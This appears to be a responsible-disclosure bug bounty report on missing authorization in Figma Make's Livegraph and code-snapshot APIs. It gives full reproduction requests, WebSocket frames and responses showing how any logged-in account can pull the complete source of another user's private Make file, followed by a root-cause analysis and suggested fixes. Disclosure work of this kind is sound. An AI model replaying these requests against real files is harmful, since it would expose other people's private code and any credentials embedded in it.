# 标题 必填
title: Missing authorization in MakeVersion Livegraph and code snapshot APIs leaks complete source code of private Figma Make files

# 资产 必填
Asset: https://www.figma.com
API:
- wss://www.figma.com/api/livegraph (`FileMakeVersionsView`)
- GET /api/rev/:file_key/code_snapshot/:code_snapshot_key
- GET /api/ai_chat/:file_key/make_versions/:thread_id

# 严重程度 必填
Severity: HIGH

# 弱点 必填
Weakness: CWE-862 Missing Authorization / CWE-639 Authorization Bypass Through User-Controlled Key

# 描述 必填
## Summary:
Two file-scoped Figma Make data paths fail to verify that the requester can access the target file. Together, they allow any logged-in Figma account to download the complete source code of another user's private Make file using only its file key.

1. The `FileMakeVersionsView` Livegraph subscription works without authentication and returns private MakeVersion records for an arbitrary `fileKey`. Each record includes the private file's `chatThreadId` and `codeSnapshotKey`.
2. `GET /api/rev/{victim_file_key}/code_snapshot/{leaked_code_snapshot_key}` returns all source files to any authenticated Figma user, even when that user has no access to the victim file.

This is not access based on a public or shared Make file. In the same test, the attacker was denied access to the victim's thread list with HTTP 403 (`You don't have permission to use AI in this file.`), while the version and source-code endpoints returned the private data with HTTP 200.

The attack is fully attacker-driven after learning a Figma file key. The victim only needs to have an ordinary saved Make version. They do not need to upload attacker-controlled content, approve a request, visit a URL, or interact with the attacker.

## Steps To Reproduce:
Use two unrelated Figma accounts:
- Victim B: owns a private Figma Make file and has saved at least one Make version.
- Attacker A: a separate logged-in Figma account with no relationship to B and no access to the file.

For deterministic testing, I created a disposable private Make as B, saved a source snapshot containing a unique marker, and attached it to a normal MakeVersion record. These are the same first-party APIs used by the Make client. The authorization failure occurs in the attacker requests below, not in fixture creation.

### 1. Establish the negative authorization control
As attacker A, request the victim file's AI thread list:

```http
GET /api/ai_chat/threads?owner_id=VICTIM_PRIVATE_FILE_KEY&owner_type=file HTTP/1.1
Host: www.figma.com
Cookie: ATTACKER_A_SESSION
X-Figma-User-ID: ATTACKER_A_USER_ID
X-Figma-File-Key: VICTIM_PRIVATE_FILE_KEY
```

Response:

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"message":"You don't have permission to use AI in this file."}
```

This proves A cannot access the private Make file through the normal file-scoped AI surface.

### 2. Enumerate the private file's Make versions anonymously
Connect to Livegraph with no Cookie header:

```text
wss://www.figma.com/api/livegraph?pv=1&userId=&anonUserId=&clientType=web&preload=%7B%7D&requestedProtocolVersion=2&clientUrl=https%3A%2F%2Fwww.figma.com%2Fmake%2FVICTIM_PRIVATE_FILE_KEY&connectionType=initial&reconnect=0
```

Send the anonymous auth frame:

```json
{"messageType":"auth","clientType":"web","args":{"userId":null,"anonymousUserId":null},"tags":{"clientType":"web","clientUrl":"https://www.figma.com/make/VICTIM_PRIVATE_FILE_KEY"},"clientRequestedVersion":2}
```

Subscribe using only the victim file key:

```json
{"messageType":"subscribe","viewName":"FileMakeVersionsView","viewHash":"abababababababababababababababab","loadType":"initial","args":{"fileKey":"VICTIM_PRIVATE_FILE_KEY","firstPageSize":10}}
```

The unauthenticated response contains the private MakeVersion record (IDs redacted):

```json
{
  "messageType": "denormalizedPendingMutations",
  "mutations": {
    "[\"FileMakeVersionsView\",...]": {
      "MakeVersion": {
        "queries": {
          "...": {
            "initial": {
              "VERSION_ID": {
                "id": "VERSION_ID",
                "chatThreadId": "PRIVATE_THREAD_UUID",
                "versionNumber": "1",
                "codeSnapshotKey": "PRIVATE_CODE_SNAPSHOT_KEY",
                "title": "Normal saved version",
                "favorited": false
              }
            }
          }
        }
      }
    }
  }
}
```

Tested result: anonymous Livegraph returned both the exact victim `chatThreadId` and exact `codeSnapshotKey`. The response was byte-for-byte the same size as the authenticated victim baseline. There was no permission error.

### 3. Download the victim's complete source as attacker A
Use the leaked snapshot key with A's unrelated Figma session:

```http
GET /api/rev/VICTIM_PRIVATE_FILE_KEY/code_snapshot/PRIVATE_CODE_SNAPSHOT_KEY HTTP/1.1
Host: www.figma.com
Cookie: ATTACKER_A_SESSION
X-Figma-User-ID: ATTACKER_A_USER_ID
X-Figma-File-Key: VICTIM_PRIVATE_FILE_KEY
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "meta": {
    "code_files": {
      "src/App.tsx": "export const privateMarker = 'H1_B_PRIVATE_SOURCE_<random>';\nexport default function App() { return null; }\n"
    },
    "binary_files": {}
  }
}
```

The unique private marker was returned in full. B's owner request returned the same source. An anonymous request to this second endpoint returned 401, so exploitation requires only any ordinary logged-in Figma account.

### 4. Independent REST confirmation of the metadata authorization failure
If the leaked `chatThreadId` is supplied directly, A can also retrieve the victim's private version records through REST:

```http
GET /api/ai_chat/VICTIM_PRIVATE_FILE_KEY/make_versions/PRIVATE_THREAD_UUID?first_page_size=10 HTTP/1.1
Host: www.figma.com
Cookie: ATTACKER_A_SESSION
X-Figma-User-ID: ATTACKER_A_USER_ID
```

Response: HTTP 200 containing the same `code_snapshot_key`. The normal thread-list endpoint remains 403 for A. This independently confirms that the failure is in file/thread authorization, not a Livegraph parsing artifact.

## Authorization matrix (tested twice with fresh disposable private files):

| Request | Victim B | Attacker A (no file access) | Anonymous |
|---|---:|---:|---:|
| Normal private thread list | 200, thread returned | 403, denied | 401 |
| `FileMakeVersionsView(fileKey)` | Version + thread + snapshot key | Version + thread + snapshot key | Version + thread + snapshot key |
| REST `make_versions/{threadId}` | 200, snapshot key | 200, snapshot key | 401 |
| `code_snapshot/{snapshotKey}` | 200, complete source | 200, complete source | 401 |

Additional binding control: supplying B's snapshot key under A's own file key returned 404 `Code snapshot not found`. The service verifies that the snapshot belongs to the path's file key, but it never verifies that the current user may read that file. That missing user-to-file authorization check is the root cause.

## Impact:
- Complete confidentiality loss for affected private Figma Make projects: all stored text source files are returned, not only metadata or a rendered preview.
- Source may contain proprietary application logic, unreleased product code, internal API locations, comments, prompts, and credentials accidentally embedded by the project owner.
- Anonymous enumeration of private version and thread identifiers makes the source endpoint directly exploitable by any logged-in account; snapshot keys do not need to be guessed.
- The victim receives no share request or interaction prompt, and the attacker does not need team/org membership.
- The issue crosses two independent accounts and reproduced on two fresh private Make files. All disposable files were trashed immediately after testing.

## Root cause:
`FileMakeVersionsView` filters MakeVersion rows by the caller-controlled `fileKey` but does not apply the target file's read authorization. The REST MakeVersion path similarly trusts the supplied file/thread identifiers. The code snapshot endpoint checks the snapshot-to-file relationship but omits the current-user-to-file permission check.

The correct permission is already enforced by the sibling thread-list endpoint, which returns 403 for the same attacker, same victim file, and same session.

## Suggested fix:
1. Before returning any MakeVersion row, require read access to the referenced file and access to the associated thread. Apply this to Livegraph and REST paths.
2. Before returning a code snapshot, authorize the current user against the target file, not only the snapshot/file key relationship.
3. Do not treat `fileKey`, `threadId`, or `codeSnapshotKey` as bearer capabilities.
4. Add cross-account tests covering private files for `FileMakeVersionsView`, `/api/ai_chat/:file/make_versions/:thread`, and `/api/rev/:file/code_snapshot/:snapshot`.

# 附件 非必填
Attachments:
- A minimal two-account PoC can be provided if needed. No victim source or persistent test artifact is included; disposable test files were deleted after verification.
